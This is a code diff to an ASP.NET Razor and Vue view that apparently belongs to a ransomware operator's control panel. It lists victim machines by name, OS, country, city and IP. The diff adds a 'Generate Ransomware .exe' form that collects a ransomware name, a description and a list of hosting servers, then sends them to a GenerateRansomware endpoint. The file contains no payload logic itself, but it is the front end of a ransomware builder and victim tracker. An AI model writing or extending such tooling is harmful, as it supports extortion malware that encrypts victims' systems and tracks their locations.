@@ -3,6 +3,26 @@
     Layout = "~/Views/Shared/_Layout.cshtml";
 }
 
+<style>
+    .custom-scroll {
+        overflow-y: scroll;
+        -webkit-overflow-scrolling: touch;
+        -ms-overflow-style: none;
+        scrollbar-width: none;
+    }
+
+        .custom-scroll::-webkit-scrollbar {
+            display: none; /* Safari and Chrome */
+        }
+
+        .custom-scroll ul li {
+            list-style: none;
+        }
+    .box-body {
+        background-color:#666
+    }
+</style>
+
 <div id="app" class="row">
     <div class="col-md-12">
 
@@ -35,33 +55,33 @@
                         </thead>
                         <tbody>
                             @*@foreach (VictimDetail record in Model)
-                            {
-                                <tr>
-                                    <td class="text-center">@record.MachinName</td>
-                                    <td class="text-center">@record.MachineOS</td>
-                                    <td class="text-center">@record.Country</td>
-                                    <td class="text-center">@record.City</td>
-                                    <td class="text-center">@record.Ip </td>
-                                    <td class="no-padding">
-                                        <div class="margin">
-                                            <div class="btn-group">
-                                                <button class=" btn-danger dropdown-toggle" type="button" data-toggle="dropdown" aria-expanded="false">
-                                                    <span class="caret"></span>
-                                                    <span class="sr-only"></span>
-                                                </button>
-                                                <ul class="dropdown-menu" role="menu">
-                                                    <li>
-                                                        <a href="#" v-on:click="detail(@record.Id)">Details</a>
-                                                    </li>
-                                                    <li>
-                                                        <a href="#" v-on:click="remove(@record.Id)">Delete</a>
-                                                    </li>
-                                                </ul>
+                                {
+                                    <tr>
+                                        <td class="text-center">@record.MachinName</td>
+                                        <td class="text-center">@record.MachineOS</td>
+                                        <td class="text-center">@record.Country</td>
+                                        <td class="text-center">@record.City</td>
+                                        <td class="text-center">@record.Ip </td>
+                                        <td class="no-padding">
+                                            <div class="margin">
+                                                <div class="btn-group">
+                                                    <button class=" btn-danger dropdown-toggle" type="button" data-toggle="dropdown" aria-expanded="false">
+                                                        <span class="caret"></span>
+                                                        <span class="sr-only"></span>
+                                                    </button>
+                                                    <ul class="dropdown-menu" role="menu">
+                                                        <li>
+                                                            <a href="#" v-on:click="detail(@record.Id)">Details</a>
+                                                        </li>
+                                                        <li>
+                                                            <a href="#" v-on:click="remove(@record.Id)">Delete</a>
+                                                        </li>
+                                                    </ul>
+                                                </div>
                                             </div>
-                                        </div>
-                                    </td>
-                                </tr>
-                            }*@
+                                        </td>
+                                    </tr>
+                                }*@
                         </tbody>
                     </table>
                 </div>
@@ -69,8 +89,8 @@
 
             <div class="col-md-6">
                 <div class="box box-danger" style="background-color:#666">
-                    <div class="box-header">
-
+                    <div class="box-header border-bottom">
+                        <h4 class="box-title" style="color:#ffff">Generate Ransomware .exe</h4>
                     </div>
 
                     <div class="box-body">
@@ -78,23 +98,96 @@
                             <div class="col-md-6">
                                 <div class="form-group form-group-sm">
                                     <label class="control-label label-text-color">Ransomware name</label>
-                                    <input autocomplete="off" type="text" class="form-control text-center input-console" />
+                                    <input v-model="ransomware_name" autocomplete="off" type="text" class="form-control input-console" />
                                 </div>
 
                                 <div class="form-group form-group-sm">
                                     <label class="control-label label-text-color">Ransomware Description</label>
-                                    <input autocomplete="off" type="text" class="form-control text-center input-console" />
+                                    <input v-model="ransomware_descrip" autocomplete="off" type="text" class="form-control input-console" />
+                                </div>
+
+                                <div class="form-group form-group-sm">
+                                    <label class="control-label label-text-color">My hosting servers</label>
+                                    <div class="input-group" v-on:keyup.enter="addhost">
+                                        <input v-model="new_host" autocomplete="off" type="text" class="form-control input-console" />
+                                        <span class="input-group-btn">
+                                            <button @@click="addhost" class="btn btn-tumblr btn-flat" type="button"><i class="fa fa-plus-square"></i></button>
+                                        </span>
+                                    </div>
                                 </div>
                             </div>
                             <div class="col-md-6">
 
+                                <div class="form-group form-group-sm">
+                                    <label class="control-label label-text-color">Hosts list</label>
+
+                                    <div class="custom-scroll" style="max-height:200px;height:200px; background-color:#808080">
+                                        <ul v-for="host,index in host_list" :key="index">
+                                            <li>
+                                                <span>{{host}}</span>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="col-md-12">
+                                <div class="progress">
+                                    <div class="progress-bar" role="progressbar" style="width: 25%;" aria-valuenow="25" aria-valuemin="0" aria-valuemax="100">25%</div>
+                                </div>
+                            </div>
+                            <div class="col-md-12 center-block">
+                                <div class="box no-border">
+                                    <div class="box-body no-border">
+                                        <button @@click="generate_ransomware" type="button" class="btn btn-primary btn-xs btn-block">Generate Ransomware</button>
+                                    </div>
+                                </div>
                             </div>
                         </div>
                     </div>
                 </div>
             </div>
         </div>
-
     </div>
-
 </div>
+
+<script src="~/js/javascript-map.min.js"></script>
+
+@section scripts{
+
+    <script type="text/javascript">
+
+        var dataLst = new Vue({
+            el: "#app",
+            mixins: [vue_base],
+            data: {
+                new_host:"",
+                host_list: [],
+                ransomware_name: "",
+                ransomware_descrip: "",
+
+            },
+            mounted() {
+            },
+            methods: {
+
+                addhost: function () {
+                    this.host_list.push(this.new_host);
+                },
+
+                generate_ransomware: function () {
+                    var parameters = {
+                        name: this.ransomware_name,
+                        description: this.ransomware_descrip,
+                        hosts: JSON.stringify(this.host_list)
+                    };
+
+                    this.get_request('@Url.Action("GenerateRansomware", "Management")', parameters).then(response => {
+                        
+                    });
+                },
+            }
+        });
+    </script>
+}
